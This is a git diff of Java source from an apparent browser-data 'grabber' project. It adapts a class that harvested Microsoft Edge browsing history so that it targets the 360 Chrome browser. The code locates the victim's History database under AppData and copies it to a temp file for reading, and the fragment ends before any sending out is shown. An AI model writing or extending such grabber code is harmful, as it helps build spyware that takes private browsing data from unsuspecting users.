@@ -1,4 +1,4 @@
-package ninja.maki.grabber.edge;
+package ninja.maki.grabber.broswer360;
 
 import ninja.maki.utils.SystemUtil;
 
@@ -9,14 +9,14 @@ import java.sql.DriverManager;
 import java.sql.ResultSet;
 import java.sql.Statement;
 
-public class EdgeHistory {
+public class Browser360History {
     public static void grab() {
         SystemUtil.console();
-        String historyTemp = System.getProperty("java.io.tmpdir") + "edgehistory.tmp";
-        String historyPath = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History";
+        String historyTemp = System.getProperty("java.io.tmpdir") + "broswer360history.tmp";
+        String historyPath = System.getProperty("user.home") + "\\AppData\\Local\\360Chrome\\Chrome\\User Data\\Default\\History";
         File historyTempFile = new File(historyTemp);
         try {
-            historyTempFile = File.createTempFile("edgehistory", ".tmp");
+            historyTempFile = File.createTempFile("broswer360history", ".tmp");
             historyTemp = historyTempFile.getAbsolutePath();
         }catch (IOException e){
             SystemUtil.console("Failed to create temp file.");
